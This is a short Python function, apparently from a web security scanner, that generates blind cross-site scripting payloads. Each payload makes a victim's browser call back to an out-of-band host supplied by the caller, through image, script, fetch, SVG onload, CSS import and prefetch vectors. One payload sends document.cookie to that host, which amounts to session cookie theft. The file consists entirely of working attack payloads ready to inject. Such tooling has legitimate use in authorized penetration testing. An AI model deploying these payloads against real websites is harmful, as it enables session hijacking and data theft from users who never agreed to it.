from typing import List
import urllib.parse

def build_blind_payloads(oob_host: str, param: str) -> List[str]:
    tag = urllib.parse.quote(f"atilla-{param}")
    h   = oob_host.rstrip("/")
    return [
        f'<img src="http://{h}/{tag}">',
        f'<script src="http://{h}/{tag}"></script>',
        f"<script>fetch('http://{h}/{tag}')</script>",
        f'<img src=x onerror="new Image().src=\'http://{h}/{tag}/\'+document.cookie">',
        f"<svg/onload=\"new Image().src='http://{h}/{tag}'\">",
        f"<style>@import 'http://{h}/{tag}'</style>",
        f"<link rel=prefetch href='http://{h}/{tag}'>",
    ]
